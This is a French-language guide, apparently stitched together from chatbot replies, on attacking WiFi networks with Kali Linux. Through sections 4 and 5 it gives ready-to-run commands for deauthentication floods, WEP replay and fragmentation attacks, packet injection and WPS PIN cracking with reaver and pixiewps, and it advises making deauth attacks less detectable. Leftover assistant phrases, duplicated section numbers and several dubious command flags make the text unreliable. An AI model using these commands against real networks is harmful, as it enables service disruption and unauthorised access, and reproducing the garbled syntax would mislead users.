
# Guide complet sur l'utilisation de Kali Linux pour les tests de sécurité WiFi

## Introduction

Kali Linux est une distribution Linux spécialisée dans les tests de sécurité et les audits de vulnérabilité. Dans ce guide, nous explorerons l'utilisation de Kali Linux pour les tests de sécurité liés au WiFi. Nous couvrirons les étapes du scan des réseaux à la capture de paquets, en mettant l'accent sur l'exploitation de vulnérabilités telles que le WEP, le WPA, et les failles WPS.

## 1. Préparation de l'environnement

Avant de commencer, assurez-vous d'avoir une carte réseau compatible avec le mode de surveillance. Vous pouvez vérifier la compatibilité avec la commande suivante :

```bash
iw list
```
Lorsque vous exécutez la commande `iw list`, vous obtenez des informations détaillées sur toutes les interfaces WiFi disponibles sur votre système. Pour préparer l'environnement et vérifier la compatibilité de votre carte WiFi avec le mode de surveillance, assurez-vous de rechercher les informations suivantes dans la sortie de la commande :

1. **Mode de fonctionnement :** Vérifiez que le mode de fonctionnement de votre carte WiFi prend en charge le mode de surveillance. Recherchez une ligne similaire à "Supported interface modes" et assurez-vous que "Monitor" est répertorié.

2. **Fréquences supportées :** Assurez-vous que votre carte WiFi supporte les fréquences nécessaires pour la surveillance. Recherchez les sections qui mentionnent "Frequencies" et vérifiez que les fréquences 2.4 GHz et/ou 5 GHz sont prises en charge.

3. **Capacités de la carte :** Recherchez des informations sur les capacités de la carte, telles que la prise en charge des canaux, des débits, etc. Ces informations peuvent vous aider à choisir le meilleur canal pour la surveillance.

Voici un exemple simplifié de ce à quoi pourrait ressembler une partie de la sortie de `iw list` :

```bash
Wiphy phy0
    max # scan SSIDs: 4
    max scan IEs length: 2257 bytes
    Retry short limit: 7
    Retry long limit: 4
    Coverage class: 0 (up to 0m)
    Available Antennas: TX 0 RX 0
    Supported interface modes:
         * IBSS
         * managed
         * AP
         * AP/VLAN
         * monitor
         * P2P-client
         * P2P-GO
         * P2P-device
    Band 1:
        Capabilities: 0x16e
            RX LDPC
            HT20/HT40
            SM Power Save disabled
            RX HT20 SGI
            RX HT40 SGI
            No RX STBC
```

Dans cet exemple, la carte WiFi prend en charge le mode "monitor", ce qui est essentiel pour les tests de sécurité liés au WiFi. Assurez-vous que votre carte WiFi affiche une prise en charge similaire avant de procéder aux tests.

## 2. Scan des réseaux WiFi


### 2.1 Identification de la carte WiFi

Utilisez la commande `iwconfig` pour afficher toutes les interfaces réseau disponibles. Identifiez votre carte WiFi parmi les interfaces listées.

```bash
iwconfig
```

Assurez-vous de noter le nom de l'interface WiFi que vous souhaitez utiliser (par exemple, `wlan0`).

### 2.2 Passage en mode monitor

Avant de lancer le scan des réseaux WiFi, mettez l'interface WiFi en mode monitor avec la commande `airmon-ng`. Remplacez `wlan0` par le nom de votre interface WiFi.

```bash
sudo airmon-ng start wlan0
```

Cela créera une nouvelle interface, généralement appelée `wlan0mon`, en mode monitor. Vous pouvez vérifier cela à l'aide de la commande `iwconfig` :

```bash
iwconfig
```

Assurez-vous que votre interface WiFi est maintenant en mode monitor.

### 2.3 Scan des réseaux WiFi

Utilisez l'outil `airodump-ng` pour scanner les réseaux WiFi disponibles avec votre interface WiFi en mode monitor. Remplacez `wlan0mon` par le nom de votre interface monitor.

```bash
sudo airodump-ng wlan0mon
```

Vous verrez alors une liste des réseaux WiFi à proximité avec des informations détaillées.

Ces étapes garantissent que vous utilisez la bonne carte WiFi et qu'elle est configurée en mode monitor pour le scan des réseaux.


## 3. Capture de paquets basique avec airodump-ng

La capture de paquets est une étape cruciale dans les tests de sécurité WiFi. Utilisez `airodump-ng` pour surveiller et capturer les paquets échangés sur le réseau cible.

### 3.1 Lancement de airodump-ng

Utilisez la commande suivante pour lancer `airodump-ng` sur l'interface WiFi en mode monitor. Remplacez `wlan0mon` par le nom de votre interface monitor.

```bash
sudo airodump-ng wlan0mon
```

### 3.2 Capture de paquets du réseau cible

Relancez `airodump-ng`, cette fois en spécifiant le BSSID et le canal du réseau cible. Les données seront enregistrées dans un fichier de capture.

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture_file wlan0mon
```

Voici comment spécifier plusieurs canaux dans la commande `airodump-ng` :

```bash
sudo airodump-ng -c 1,6,11  -w capture_file wlan0mon
```

Dans cet exemple, les canaux 1, 6 et 11 sont spécifiés avec l'option `-c`, séparés par des virgules. Assurez-vous de remplacer `<BSSID>` par l'adresse MAC du réseau cible quand il est nécessaire.

Cette commande permettra à `airodump-ng` de capturer des paquets des réseaux fonctionnant sur les canaux 1, 6 et 11 simultanément. Cette approche peut être particulièrement efficace lorsque vous souhaitez cibler des réseaux qui utilisent plusieurs canaux pour optimiser la performance du réseau WiFi.

N'oubliez pas que la carte WiFi utilisée doit être capable de capturer des paquets sur plusieurs canaux simultanément pour que cette technique fonctionne correctement.

La capture basique est maintenant en cours. Cependant, pour augmenter le nombre de paquets capturés, vous pouvez effectuer des actions supplémentaires en parallèle (Chapitre 4).


## 4. Augmentation du nombre de paquets capturés

### 4.1 Déauthentification (DEAUTH)

Lancez une attaque de déauthentification pour forcer les périphériques connectés à se déconnecter, générant ainsi plus de paquets lorsqu'ils se reconnectent.
Effectivement, il existe différentes variantes de l'attaque de déauthentification (DEAUTH) que vous pouvez utiliser en fonction de la situation et des outils disponibles. Voici deux autres variantes couramment utilisées :

#### 4.1.1 Variante avec aireplay-ng

Utilisez `aireplay-ng` pour générer des déauthentifications. Cela peut être particulièrement utile si vous avez besoin de personnaliser davantage les paramètres de l'attaque.

```bash
sudo aireplay-ng --deauth <nombre_de_deauth_packets> -a <BSSID> -c <client_MAC> -p <delai_en_millisecondes> wlan0mon
```

- `<nombre_de_deauth_packets>` : le nombre de paquets de déauthentification à envoyer.
- `<BSSID>` : l'adresse MAC du point d'accès cible.
- `<client_MAC>` : l'adresse MAC du client que vous souhaitez déauthentifier (facultatif).
- `-p <delai_en_millisecondes>` : spécifiez le délai entre l'envoi de chaque paquet en millisecondes.

Le `<nombre_de_deauth_packets>` correspond au nombre de paquets de déauthentification que vous souhaitez envoyer lors de l'attaque. Plus le nombre est élevé, plus l'impact sur les périphériques ciblés sera important.

Le délai entre l'envoi de chaque paquet est généralement défini par défaut dans les outils, mais vous pouvez souvent ajuster ce délai en ajoutant un paramètre supplémentaire.


#### 4.1.2 Variante avec mdk3

`mdk3` est un autre outil populaire pour les attaques de déauthentification. Vous pouvez l'utiliser de la manière suivante :

```bash
sudo mdk3 wlan0mon d -b <BSSID> -c <channel> -w <delai_en_millisecondes>
```

- `<BSSID>` : l'adresse MAC du point d'accès cible.
- `<channel>` : le canal sur lequel le point d'accès opère.
- `-w <delai_en_millisecondes>` : spécifiez le délai entre l'envoi de chaque paquet en millisecondes.


#### 4.1.3 Synthèse

Assurez-vous de choisir des valeurs de délai appropriées pour éviter de surcharger le réseau. L'utilisation de délais plus longs peut rendre l'attaque moins détectable et plus efficace. Expérimentez avec ces paramètres pour trouver la meilleure configuration en fonction de votre scénario d'utilisation.

**Note :** Les attaques de déauthentification peuvent causer des interruptions temporaires dans le réseau ciblé. Assurez-vous d'avoir l'autorisation nécessaire avant d'effectuer de telles attaques, et utilisez-les de manière responsable et éthique.

### 4.2 Rejeu de paquets (Replay)

Si le réseau utilise le chiffrement WEP, capturez du trafic chiffré puis rejouez ces paquets pour générer plus de données utiles.

Capturez les paquets (Chapitre 3):

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w wep_capture_file wlan0mon
```

Rejouez les paquets :

```bash
sudo aireplay-ng -2 -b <BSSID> -h <votre_adresse_mac> -r wep_capture_file wlan0mon
```

Bien sûr, voici une expansion des paramètres pour l'injection de trafic avec `aireplay-ng` et `mdk3`.

Bien entendu, voici une synthèse des chapitres enfants `4.3.x` regroupés en un seul chapitre avec des détails sur chaque paramètre :

### 4.3 Injection de trafic avec aireplay-ng

```bash
sudo aireplay-ng -9 wlan0mon
```

#### 4.3.1 Ajustement du délai entre les paquets

```bash
sudo aireplay-ng -9 -p <delai_en_millisecondes> wlan0mon
```

- `-p <delai_en_millisecondes>` : spécifie le délai entre l'envoi de chaque paquet en millisecondes.

#### 4.3.2 Personnalisation du nombre de paquets envoyés

```bash
sudo aireplay-ng -9 -l <nombre_de_paquets> wlan0mon
```

- `-l <nombre_de_paquets>` : spécifie le nombre de paquets à envoyer.

#### 4.3.3 Ajout d'un délai entre les paquets

```bash
sudo aireplay-ng -9 -D wlan0mon
```

- `-D` : ajoute un délai de 1 seconde entre les paquets de déauthentification.

### 4.3.4 Utilisation d'une carte spécifique

```bash
sudo aireplay-ng -9 -D -e <ESSID> -a <BSSID> -c <client_MAC> -p <delai_en_millisecondes> -l <nombre_de_paquets> -i <votre_carte>
```

- `-D` : ajoute un délai de 1 seconde entre les paquets de déauthentification.
- `-e <ESSID>` : spécifie le SSID du réseau.
- `-a <BSSID>` : spécifie l'adresse MAC du point d'accès.
- `-c <client_MAC>` : spécifie l'adresse MAC du client.
- `-p <delai_en_millisecondes>` : spécifie le délai entre l'envoi de chaque paquet en millisecondes.
- `-l <nombre_de_paquets>` : spécifie le nombre de paquets à envoyer.
- `-i <votre_carte>` : spécifie votre interface WiFi.

Cette synthèse réunit les paramètres détaillés pour l'injection de trafic avec `aireplay-ng`. Vous pouvez ajuster ces paramètres en fonction de vos besoins spécifiques et des conditions du réseau.

Je m'excuse pour la confusion. Voici le chapitre "4.4 Injection de trafic avec mdk3" avec des détails sur chaque paramètre :

### 4.4 Injection de trafic avec mdk3

```bash
sudo mdk3 wlan0mon b -n <nombre_de_paquets>
```

#### 4.4.1 Ajustement de la puissance d'injection

```bash
sudo mdk3 wlan0mon b -n <nombre_de_paquets> -g <puissance_d_injection>
```

- `-g <puissance_d_injection>` : spécifie la puissance d'injection (augmentez ou diminuez selon les besoins).

#### 4.4.2 Utilisation d'une liste de cibles

```bash
sudo mdk3 wlan0mon b -n -s <liste_de_cibles.txt>
```

- `-s <liste_de_cibles.txt>` : spécifie un fichier texte contenant une liste d'adresses MAC de cibles.

#### 4.4.3 Utilisation de plusieurs cartes WiFi

```bash
sudo mdk3 wlan0mon wlan1mon wlan2mon b -n <nombre_de_paquets>
```

Ces paramètres supplémentaires offrent des options pour ajuster le comportement de l'injection de trafic avec mdk3 en fonction de vos besoins spécifiques et des conditions du réseau.

Bien sûr, voici le chapitre "4.5 Attaque de fragmentation avec aireplay-ng" avec des détails sur chaque paramètre :

### 4.5 Attaque de fragmentation avec aireplay-ng

```bash
sudo aireplay-ng -5 -b <BSSID> -h <votre_adresse_mac> wlan0mon
```

#### 4.5.1 Ajustement du nombre de paquets par seconde

```bash
sudo aireplay-ng -5 -b <BSSID> -h <votre_adresse_mac> -p <paquets_par_seconde> wlan0mon
```

- `-p <paquets_par_seconde>` : spécifie le nombre de paquets par seconde à envoyer (augmentez ou diminuez selon les besoins).

#### 4.5.2 Utilisation d'une carte spécifique

```bash
sudo aireplay-ng -5 -b <BSSID> -h <votre_adresse_mac> -p <paquets_par_seconde> -i <votre_carte>
```

- `-i <votre_carte>` : spécifie votre interface WiFi.

#### 4.5.3 Personnalisation du délai entre les paquets

```bash
sudo aireplay-ng -5 -b <BSSID> -h <votre_adresse_mac> -p <paquets_par_seconde> -D wlan0mon
```

- `-D` : ajoute un délai de 1 seconde entre les paquets de déauthentification.

Ces paramètres supplémentaires vous permettent d'ajuster l'attaque de fragmentation en fonction de vos besoins spécifiques et des conditions du réseau. Expérimentez avec ces paramètres pour optimiser l'efficacité de l'attaque.

## 5. Attaques WPS

Les attaques WPS (Wi-Fi Protected Setup) visent à exploiter les faiblesses du protocole de configuration de sécurité Wi-Fi pour accéder plus facilement à un réseau sans fil. Voici comment effectuer des attaques WPS avec des détails sur chaque sous-chapitre.

### 5.1. Présentation de l'Attaque WPS

L'Attaque WPS exploite les vulnérabilités du processus de configuration rapide Wi-Fi. Avant de lancer une attaque WPS, il est essentiel de comprendre les principes fondamentaux.

### 5.2. Scan des Réseaux WPS

Avant d'attaquer, il est nécessaire d'identifier les réseaux activant WPS. Utilisez `wash` pour détecter les réseaux WPS activés.

```bash
sudo wash -i <votre_carte>
```

- `-i <votre_carte>` : spécifie votre interface WiFi.

### 5.3. Attaque par Brute-Force

Une attaque par force brute sur le code PIN WPS est une méthode courante pour compromettre la sécurité. Utilisez `reaver` pour lancer cette attaque.

```bash
sudo reaver -i <votre_carte> -b <BSSID> -vv
```

- `-i <votre_carte>` : spécifie votre interface WiFi.
- `-b <BSSID>` : spécifie l'adresse MAC du point d'accès.

### 5.4. Attaque Pixie Dust

L'attaque Pixie Dust exploite une faiblesse dans la génération des clés WPS. Utilisez `pixiewps` pour exécuter cette attaque.

```bash
sudo pixiewps -e <ESSID> -s <BSSID> -z <hash>
```

- `-e <ESSID>` : spécifie le SSID du réseau.
- `-s <BSSID>` : spécifie l'adresse MAC du point d'accès.
- `-z <hash>` : spécifie le hash Pixie Dust.

### 5.5. Attaque Reaver avec Verbose

L'attaque Reaver peut être ajustée pour fournir une sortie détaillée, ce qui peut être utile pour l'analyse.

```bash
sudo reaver -i <votre_carte> -b <BSSID> -vv
```

- `-i <votre_carte>` : spécifie votre interface WiFi.
- `-b <BSSID>` : spécifie l'adresse MAC du point d'accès.
- `-vv` : augmente la verbosité de la sortie.

### 5.6. Utilisation d'une Liste de PIN

Utilisez `reaver` avec une liste de codes PIN prédéfinis pour tenter une attaque.

```bash
sudo reaver -i <votre_carte> -b <BSSID> -p <liste_PIN>
```

- `-i <votre_carte>` : spécifie votre interface WiFi.
- `-b <BSSID>` : spécifie l'adresse MAC du point d'accès.
- `-p <liste_PIN>` : spécifie un fichier contenant une liste de codes PIN.

Ces étapes détaillées devraient vous fournir une compréhension approfondie de la réalisation d'attaques WPS avec différentes approches. N'oubliez pas d'utiliser ces connaissances de manière éthique et légale.


## 5. Analyse des paquets avec Wireshark

Ouvrez le fichier de capture avec Wireshark pour analyser les paquets en détail.

```bash
wireshark capture_file-01.cap
```

Explorez les paquets pour identifier des anomalies, des faiblesses de sécurité, ou d'autres informations pertinentes.

## Conclusion

Ce guide fournit une introduction complète à l'utilisation de Kali Linux pour les tests de sécurité liés au WiFi. Assurez-vous d'agir conformément à la législation en vigueur et de respecter la vie privée des autres lors de l'utilisation de ces techniques. Utilisez ces compétences de manière éthique et responsable.
